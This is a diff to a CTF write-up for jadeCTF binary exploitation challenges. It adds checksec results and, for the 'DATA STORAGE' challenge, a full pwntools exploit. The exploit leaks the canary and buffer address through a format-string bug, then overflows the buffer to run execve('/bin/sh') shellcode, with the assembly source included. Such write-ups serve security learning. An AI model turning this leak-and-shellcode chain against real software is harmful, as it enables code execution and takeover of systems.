@@ -1,5 +1,14 @@
 # BABY PWN
 We are given a binary.  
+First, run checksec on it:
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
+
 On analyzing it with Ghidra, we find the `start_program()` function:
 ```c
 void start_program(void)
@@ -56,6 +65,16 @@ p.interactive()
 FLAG: `jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}`
 
 # DATA STORAGE
+First run checksec on the binary:
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX disabled
+PIE:      PIE enabled
+RWX:      Has RWX segments
+```
+
 Analyzing the binary in Ghidra. This is the main function:
 ```c
 undefined8 main(void)
@@ -187,4 +206,123 @@ void database_store(void)
 }
 ```
 This is a big code. First it is taking some inputs, and then we can see that we have a format strings vulnerability in a printf statement. Moving on, it takes an input (we have buffer overflow here as gets is being used). Then it calls the `modify()` function on our input.
+```c
+undefined * modify(undefined *param_1,long param_2,int param_3,int param_4)
 
+{
+  int local_20;
+  long local_18;
+  undefined *local_10;
+  
+  local_18 = param_2;
+  local_10 = param_1;
+  for (local_20 = param_4; 0 < local_20; local_20 = local_20 + -1) {
+    *local_10 = *(undefined *)(local_18 + param_3);
+    local_10 = local_10 + 1;
+    local_18 = local_18 + 1;
+  }
+  *local_10 = 0;
+  return local_10;
+}
+```
+On seeing this function carefully we find that this is basically slicing the string (i.e., finding a substring). So, with that in mind, let's continue our analysis.  
+The code performs some substring operations and then stores each part in different variables, and then slices these variables at some positions and stores it back in our original buffer.
+So, our exploit would be like this:
+1. First, leak the address of the buffer and the canary using the format strings.
+2. Craft a shellcode which runs /bin/sh.
+3. Enter the shellcode in the buffer, and then overflow it. Enter the canary at the appropriate place, then ret to our shellcode.
+4. Reverse the scrambling part and "de-scramble" this payload, so that when the binary scrambles it, it becomes the original payload.  
+Exploit Script:
+```py
+from pwn import *
+import re
+from time import sleep
+import subprocess as sb
+
+BINARY = "chall"
+context.binary = BINARY
+ELF = context.binary
+
+# p = ELF.process()
+p = remote("34.76.206.46", 10003)
+
+def scramble(x):
+    ptr = 0
+    name = x[ptr:ptr+n]
+    ptr += n
+    admno = x[ptr:ptr+an]
+    ptr += an
+    branch = x[ptr:ptr+b]
+    ptr += b
+    university = x[ptr:ptr+u]
+    ptr += u
+    address = x[ptr:ptr+a]
+    ptr += a
+    
+    new_x = name[:n//2] + branch[:b//3] + admno[:an//3] + university[:u//2] + address[:a//10] + branch[b//3:] + name[n//2:] + address[a//10:a//10 + a//10] + university[u//2:u//2+u//4] + admno[an//3:] + address[a//10+a//10:] + university[u//2+u//4:] + x[ptr:]
+    return new_x
+
+def fix_payload(n, an, b, u, a, payload):
+    s = n+an+b+u+a
+    x = []
+    for i in range(s):
+        x.append(i)
+    x = scramble(x)
+    new_payload = [0]*len(payload)
+    for i in range(len(x)):
+        new_payload[x[i]] = payload[i]
+    new_payload[s:] = payload[s:]
+    return new_payload
+
+payload = b"%7$p%77$p"
+p.recvuntil(b"[yes/no]?\n")
+p.send(payload)
+
+recvd = p.recvline().strip().decode()
+BUFFER = int("0x" + recvd.split("0x")[1], 16)
+CANARY = int("0x" + recvd.split("0x")[-1], 16)
+
+log.info(f"canary -> {hex(CANARY)}")
+log.info(f"buffer -> {hex(BUFFER)}")
+
+p.sendlineafter(b"correct?\n", b"yes")
+p.recvuntil(b"input is less\n")
+n, an, b, u, a = [int(x) for x in re.findall("\d+", p.recvline().decode())]
+s = n+an+b+u+a
+
+sb.run("./shellcode_compile.sh shellcode.s", shell=True)
+shellcode = open("shellcode.bin","rb").read().strip()
+sb.run("rm -rf ./shellcode.bin", shell=True)
+# shellcode = asm(shellcraft.execve(path="/bin/sh"))
+payload = b"\x90"*50 + shellcode
+payload += b"\x00"*(520-len(payload))
+payload += p64(CANARY)
+payload += b"a"*8
+payload += p64(BUFFER)
+
+payload = fix_payload(n, an, b, u, a, payload)
+payload = bytearray(payload)
+p.sendline(payload)
+
+p.interactive()
+```
+**shellcode.s**
+```s
+.global _start
+_start:
+.intel_syntax noprefix
+    xor rdx, rdx
+    xor rsi, rsi
+    lea rdi, [rip+binsh]
+    mov rax, 59
+    syscall
+    binsh:
+        .string "/bin/sh"
+```
+**shellcode_compile.sh**
+```bash
+#!/bin/bash
+gcc -nostdlib -static "$1" -o shellcode
+objcopy --dump-section .text=shellcode.bin shellcode
+rm shellcode
+```
